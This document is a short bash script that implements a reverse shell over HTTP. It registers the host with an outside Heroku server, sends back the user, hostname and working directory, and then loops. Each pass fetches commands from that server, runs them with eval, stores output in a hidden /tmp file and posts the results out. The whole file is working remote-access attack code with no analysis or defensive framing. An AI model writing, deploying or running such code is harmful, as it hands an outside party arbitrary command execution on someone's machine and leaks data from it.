#!/bin/bash

# Copyright (c) 2017 Andrea Fioraldi
# License http://opensource.org/licenses/mit-license.php MIT License

__URL="https://reverse80.herokuapp.com"
__SHELL_NAME="${HOSTNAME}  `date +%Y-%m-%d:%H:%M:%S`"

wget -q -O - "$__URL/init?name=${__SHELL_NAME}"

__PARAMS="$(whoami)@${HOSTNAME}:$(pwd)$ "
wget -q -O - "$__URL/result" --post-data="name=${__SHELL_NAME}&output=${__PARAMS}"

while true; do
    __CMD=""
    __CMD=$(wget -q -O - "$__URL/cmd?name=${__SHELL_NAME}")
    if [ "$__CMD" == "" ]; then
        sleep 1
        continue
    elif [ "$__CMD" == "__exit__" ]; then
        exit
    fi
    echo $__CMD
    __TMP="/tmp/.tmp_${__SHELL_NAME}"
    eval $__CMD > "${__TMP}" 2>&1
    __RES=$(cat "${__TMP}")
    rm "${__TMP}"
    __PARAMS="${__RES}
$(whoami)@${HOSTNAME}:$(pwd)$ "
    wget -q -O - "$__URL/result" --post-data="name=${__SHELL_NAME}&output=${__PARAMS}"
done